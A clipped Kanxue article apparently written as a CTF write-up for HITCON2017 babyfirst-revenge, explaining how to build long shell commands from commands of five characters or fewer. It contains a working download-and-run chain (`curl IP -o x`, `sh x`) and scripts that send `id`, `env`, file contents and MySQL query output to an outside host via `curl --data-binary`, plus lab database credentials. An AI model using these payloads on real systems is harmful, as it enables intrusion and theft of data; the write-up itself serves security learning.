---
title: 【微信】HITCON2017 babyfirst-revenge 看雪 CTF 复现
source: https://mp.weixin.qq.com/s/cy0ACr4tcYM0m1dpgFmRBA
source_host: mp.weixin.qq.com
clip_date: 2026-09-23T18:28:39+08:00
trace_id: 553a7ac7-ab36-4eb5-b6ad-0aea079e7d5e
content_hash: 74afedb32ed361d83d83fbe6a2d224c7bcaf09a194f7a8b735c67e447d5484f0
status: synced
tags:
  - 微信
  - CTF
  - 漏洞分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: HITCON2017 babyfirst-revenge 的核心是用长度≤5 的命令配合文件名与续行符拼出长命令；照抄第三方 WP 会失败，因为看雪环境拆掉了它们依赖的前提。
ai_summary_style: key-points
images_status:
  total: 6
  succeeded: 6
  failed_urls: []
notion_page_id: 3e475244-d011-81f5-9f37-f1d6c95d9a15
ioc:
  cves: []
  cwes: []
  hashes:
    - 3a5463e2cd4fa054a8bc44da1b1bbcaa
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> HITCON2017 babyfirst-revenge 的核心是用长度≤5 的命令配合文件名与续行符拼出长命令；照抄第三方 WP 会失败，因为看雪环境拆掉了它们依赖的前提。
> 
> - **核心思路：** 逐条提交不超过 5 字符的命令（如 `>ls\`、`>\ \`、`>-t\`），把文件名拼成脚本，得到有效命令 `ls -t>g`，再用 `sh _` / `sh g` 按修改时间倒序列出文件名。
> - **环境差异：** 靶机前面有网关反代，PHP 看到的 `REMOTE_ADDR` 是网关内网 IP，所以用自己公网 IP 算 `md5("orange"+IP)` 去猜 sandbox 路径必然失败；`ls>>a` 中的 `>>` 实测写不进；点号开头的文件名会被 `ls` 隐藏；短域名技巧不能直接换成数字 IP（数字文件名会排在 `echo` 前面）。
> - **稳定做法：** 不赌 `curl IP | sh` 管道，改成 `curl IP -o x` 落盘后再 `sh x`，实测稳定。
> - **回显与提权：** 服务器 `index.html` 返回脚本，内部用 `curl --data-binary @-` POST 到 `/upload` 回传结果，拿到运行目录 `/www/sandbox/3a5463e2...`、`www-data` 身份与 `/README.txt` 中的 MySQL 凭据 `fl4444g / SugZXUtgeJ52_Bvr`。
> - **结果：** 查询 `fl4gdb.this_is_the_fl4g` 得到 `flag{43a0eac7-3bb6-471a-864d-2a75b894c8b9}`。

**看雪学苑** *2026年9月23日 17:59*

我愿称之为“第三方 WP 都只差最后半步”的一题。

原题本身并不新，核心还是利用长度不超过 5 的命令，通过文件名、续行符和 `ls -t` 拼出长命令。

但是看雪环境有几个额外问题：

-   `REMOTE_ADDR`
    
    是网关内网 IP，不是攻击者公网 IP；
    
-   公网 IP 哈希出的 sandbox 路径没有用；
    
-   部分第三方 WP 里的命令实际上超过长度限制；
    
-   部分 WP 依赖自己持有短域名；
    
-   `curl ... | sh`
    
    在这台靶机上实测不稳定；
    
-   直接把小数点 IP 分段成文件名还容易踩隐藏文件问题。
    

Step.0 准备一个 80 端口可用的服务器

需要一台靶机能够访问的 HTTP 服务器。

我这里使用 FRP，把本地 8000 端口映射到公网服务器的 80 端口：

```toml
serverAddr = "11.4.5.14"
serverPort = 7000
auth.token = "********"

[[proxies]]
name = "ctf_http_80"
type = "tcp"
localIP = "127.0.0.1"
localPort = 8000
remotePort = 80
```

本地 HTTP 服务需要实现两个功能：

-   返回动态修改的 `index.html` ；
    
-   接收靶机通过 `curl --data-binary` 回传的数据。
    

建议记录 User-Agent。公网 80 端口会有大量扫描日志，靶机的请求大概是：

```
GET /from ... UA='curl/7.47.0'
```

* * *

Step.1 为什么不能直接照抄第三方 WP

ls>>a写不进去

不少 WP 使用下面的第一阶段：

```
>-t\
>\>q
>l\
>s\ \
ls>a
ls>>a
```

问题是这台机器>>和｜都莫名其妙写不进去，可能是ngx或者什么拦截了...

## REMOTEADDR 为网关内网 IP

REMOTE_ADDR 不是你的公网 IP

原题 sandbox 是：

```
$sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
```

但是看雪靶机前面有网关反代，PHP 看到的 `REMOTE_ADDR` 是网关内网地址，而不是攻击者出口 IP。

所以第三方 WP 中这种操作会失败：

```
md5("orange" + 自己的公网IP)
```

然后访问：

```
/sandbox/<md5>/xxx
```

算出来的目录根本不是当前 sandbox。

因此最好直接把命令结果通过 HTTP POST 回传，不要依赖猜 sandbox 路径。

短域名 WP 不能直接替换成 IP

有第三方 WP 使用类似下面的技巧：

```
>echo
>w\
*>>.a
rm w*
>ge\
*>>.a
...
```

它的前提是攻击者持有一个足够短的字母域名，例如：

```
zxzz.tk
```

因为 `echo` 在字典序上排在 `w` 、 `ge` 、 `zx` 等文件名前面，所以：

```
*>>.a
```

展开后才会变成：

```
echo w\ >> .a
```

如果直接把域名替换成数字 IP，数字文件名会排在 `echo` 前面：

```
11\
.4.\
5.1\
...
```

此时 `*` 展开后的第一个单词就不再是 `echo` ，而是数字文件名，命令直接失败。

如果把点号放在文件名开头，例如：

```
>.14
>.5\
```

## curl 管道执行不稳定

又会创建隐藏文件，默认 `ls` 根本不会把它们列出来。

curl... | sh 在这台靶机上不稳定

理论上有多种 WP 使用：

```
curl IP | sh
```

我也构造出了对应命令，而且服务器确实收到了靶机的请求：

```
GET /from ... UA='curl/7.47.0'
```

说明 `curl` 成功了。

但是返回的 payload 没有继续执行。使用：

```
sleep 10
```

做测试，也没有观察到对应延时。

所以不要在这个环境里赌管道，直接改成：

```
curl IP -o x
sh x
```

落盘以后再执行，稳定很多。

## 第一阶段构造 ls -tg

Step.2 第一阶段：构造 `ls -t>g`

这里使用 Orange 官方 exploit 的第一阶段。

按顺序请求：

```
>ls\
ls>_
>\ \
>-t\
>\>g
ls>>_
```

每个命令长度都小于等于 5。

这个阶段会利用特殊文件名和续行符，把文件 `_` 拼成一个脚本，其中有效命令是：

```
ls -t>g
```

之后执行：

```
sh _
```

就会按照文件修改时间倒序，把当前目录中的文件名写入 `g` 。

注意 `ls -t` 也会把 `_` 、 `g` 自身以及第一阶段的残留文件列进去，但这些多余行会因续行符拼接成无效命令而报错，不影响有效命令的执行。

## 第二阶段拼出下载命令

Step.3 第二阶段：拼出下载命令

假设公网服务器是：

```
11.4.5.14
```

我们要构造：

```
curl 11.4.5.14 -o x
```

把它按文件名和续行符拆成：

```
cu\
rl\
 1\
1.\
4.\
5.\
14\
 -\
o\
 x
```

由于 `ls -t` 是新文件在前，所以实际创建文件时要反过来，从最后一段开始创建：

```
>\ x
>o\
>\ -\
>14\
>5.\
>4.\
>1.\
>\ 1\
>rl\
>cu\
```

然后执行：

```
sh _
sh g
sh x
```

含义分别是：

-   `sh _`
    
    执行第一阶段生成的脚本，得到文件 `g` ；
    
-   `sh g`
    
    执行 `curl 11.4.5.14 -o x` ，下载远程 payload；
    
-   `sh x`
    
    执行下载下来的脚本。
    

服务器上应该能看到：

```
GET /from ... UA='curl/7.47.0'
```

这一步成功以后，就获得了稳定的任意命令执行能力。

## 回显命令结果与取 Flag

Step.4 回传命令结果

在公网服务器的 `index.html` 中放：

```bash
#!/bin/sh
{
echo '=== pwd/id/env ==='
pwd
id
env

echo '=== root ==='
ls -la /

echo '=== readme ==='
cat /README.txt 2>/dev/null

echo '=== mysql ==='
command -v mysql || true
} 2>&1 | curl --data-binary @- http://11.4.5.14/upload
```

重新执行：

```
sh _
sh g
sh x
```

服务器会收到：

```
POST /upload from ... UA='curl/7.47.0'
```

回显中的关键内容是：

```
/www/sandbox/3a5463e2cd4fa054a8bc44da1b1bbcaa
uid=33(www-data) gid=33(www-data)
```

以及根目录下的：

```
/README.txt
```

内容为：

```
Flag is in the MySQL database
fl4444g / SugZXUtgeJ52_Bvr
```

* * *

Step.5 查询 MySQL

把远程 `index.html` 改成：

```bash
#!/bin/sh
{
echo '=== databases ==='
  mysql -ufl4444g -pSugZXUtgeJ52_Bvr \
    -e 'show databases;'

echo '=== flag ==='
  mysql -ufl4444g -pSugZXUtgeJ52_Bvr \
    -e 'SELECT * FROM fl4gdb.this_is_the_fl4g;'
} 2>&1 | curl --data-binary @- http://11.4.5.14/upload
```

再次执行：

```
sh _
sh g
sh x
```

数据库返回：

```
Database
information_schema
fl4gdb
mysql
performance_schema
sys
```

最终查询结果：

```
secret
flag{43a0eac7-3bb6-471a-864d-2a75b894c8b9}
```

* * *

Flag

```
flag{43a0eac7-3bb6-471a-864d-2a75b894c8b9}
```

* * *

总结

这题真正可用的路线是：

```
文件名 + 续行符
        ↓
构造 ls -t>g
        ↓
用 ls -t 拼出 curl IP -o x
        ↓
下载 payload 到 x
        ↓
sh x
        ↓
curl POST 回显
        ↓
README 获取 MySQL 凭据
        ↓
查询 fl4gdb.this_is_the_fl4g
```

第三方 WP 的主要问题不是思路错误，而是看雪环境把它们依赖的条件拆掉了：

-   `ls>>a`
    
    中的 `>>` 实测写不进去（可能被拦截）；
    
-   sandbox 哈希不能用自己的公网 IP 计算；
    
-   短域名技巧不能直接替换成数字 IP；
    
-   点号开头的文件名会被 `ls` 隐藏；
    
-   `curl | sh`
    
    在当前环境中不稳定。
    

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/03aa63dd7520c5a5.png)

看雪ID：the_hs

https://bbs.kanxue.com/user-home-994475.htm

\*本文为看雪论坛优秀文章，由 the_hs 原创，转载请注明来自看雪社区

第十届安全开发者峰会【议题征集】-欢迎投稿

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bc51e60a1ab9953f.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c953c0b9b281634c.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/3bda3987c6441739.webp)

**球分享**

**球点赞**

**球在看**

点击阅读原文查看更多
